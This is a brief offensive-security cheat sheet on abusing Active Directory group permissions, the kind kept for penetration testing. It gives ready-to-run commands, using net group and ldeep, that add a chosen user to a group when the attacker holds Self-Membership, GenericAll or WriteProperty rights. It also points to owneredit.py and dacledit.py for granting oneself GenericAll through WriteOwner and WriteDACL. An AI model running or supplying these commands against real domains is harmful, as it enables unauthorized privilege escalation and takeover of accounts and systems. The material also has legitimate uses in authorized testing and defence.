# ACLs/ACEs permissions on Group

### Self (Self-Membership) on Group / GenericAll/WriteProperty on Group/ WriteProperty (Self-Membership)

#### 1) Add group member

    net group "GROUP" MY_USER /add /domain

#### 2) ldeep

    ldeep ldap -u USER -p PASSWORD -d DOMAIN -s ldap://DC add_to_group "CN=USER,DC=DOMAIN" "CN=GROUP,DC=DOMAIN"

### WriteOwner on Group

#### WriteDACL + WriteOwner. Give yourself Generic All with: owneredit.py and dacledit.py
